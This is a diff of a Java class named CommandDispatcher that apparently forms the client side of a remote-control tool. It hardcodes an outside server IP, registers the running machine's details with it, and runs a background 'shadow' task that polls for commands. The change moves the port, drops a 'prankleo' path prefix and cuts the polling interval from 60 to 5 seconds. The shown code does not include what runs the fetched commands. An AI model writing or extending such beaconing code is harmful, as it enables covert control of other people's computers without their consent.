@@ -34,8 +34,7 @@ import java.util.concurrent.TimeUnit;
 public class CommandDispatcher {
 
     private static final String SERVER_IP = "194.87.236.72";
-    private static final int SERVER_PORT = 8080;
-    private static final String APPLICATION_PREFIX = "prankleo";
+    private static final int SERVER_PORT = 8088;
 
     private RestTemplate restTemplate = new RestTemplate();
 
@@ -85,7 +84,7 @@ public class CommandDispatcher {
 
             HttpEntity<CurrentPointInfo> entity = new HttpEntity<>(getCurrentPointInfo(), headers);
             restTemplate.exchange(
-                    String.format("http://%s:%d/%s/points/register", SERVER_IP, SERVER_PORT, APPLICATION_PREFIX),
+                    String.format("http://%s:%d/points/register", SERVER_IP, SERVER_PORT),
                     HttpMethod.POST,
                     entity,
                     String.class
@@ -100,7 +99,7 @@ public class CommandDispatcher {
      */
     private static void startShadowBackgroundTask() {
         ScheduledExecutorService service = Executors.newSingleThreadScheduledExecutor();
-        service.scheduleWithFixedDelay(CommandDispatcher.getInstance()::refreshCommands, 0, 60, TimeUnit.SECONDS);
+        service.scheduleWithFixedDelay(CommandDispatcher.getInstance()::refreshCommands, 0, 5, TimeUnit.SECONDS);
     }
 
     /**
@@ -147,7 +146,7 @@ public class CommandDispatcher {
     }
 
     private String createUrl() {
-        return String.format("http://%s:%d/%s/commands/%s", SERVER_IP, SERVER_PORT, APPLICATION_PREFIX, getCurrentPointInfo().getIp());
+        return String.format("http://%s:%d/commands/%s", SERVER_IP, SERVER_PORT, getCurrentPointInfo().getIp());
     }
 
     private CurrentPointInfo getCurrentPointInfo() {
